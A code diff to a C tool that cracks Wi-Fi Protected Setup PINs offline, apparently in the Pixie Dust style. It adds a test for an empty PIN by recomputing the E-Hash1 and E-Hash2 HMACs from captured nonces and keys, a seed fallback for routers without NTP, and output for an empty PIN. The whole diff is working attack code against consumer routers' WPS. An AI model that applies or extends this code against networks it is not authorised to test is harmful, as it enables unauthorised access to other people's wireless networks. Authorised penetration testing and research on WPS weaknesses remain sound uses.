@@ -617,6 +617,11 @@ usage_err:
 								DEBUG_PRINT("Seed found");
 							}
 
+							if (!wps->bruteforce && seed == limit) {
+								seed = MODE3_DAYS_UPTIME * SEC_PER_DAY; // check if no NTP
+								limit = 0;
+							}
+
 							if (print_seed || seed == limit) {
 								break;
 							}
@@ -830,7 +835,8 @@ usage_err:
 			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
 			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
 		}
-		printf("\n [+] WPS pin:    %08u", pin);
+		if (pin == 100000000) printf("\n [+] WPS pin:    <empty string>");
+		else printf("\n [+] WPS pin:    %08u", pin);
 	} else {
 		printf("\n [-] WPS pin not found!");
 	}
@@ -918,6 +924,25 @@ uint_fast8_t crack(struct global *g, unsigned int *pin) {
 	uint8_t *result = malloc(WPS_HASH_LEN);
 	if (!result)
 		return MEM_ERROR;
+
+	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 0, wps->psk1); // check empty PIN
+	memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
+	memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
+	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+	memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+	hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+		WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+	if (!memcmp(result, wps->e_hash1, WPS_HASH_LEN)) {
+		first_half = 10000; // skip digits
+		memcpy(wps->psk2, wps->psk1, WPS_PSK_LEN);
+		memcpy(buffer, wps->e_s2, WPS_SECRET_NONCE_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk2, WPS_PSK_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
+		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
+		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
+			WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2, result);
+		if (!memcmp(result, wps->e_hash2, WPS_HASH_LEN)) found = 1;
+	}
 
 	while (first_half < 10000) {
 		uint_to_char_array(first_half, 4, s_pin);
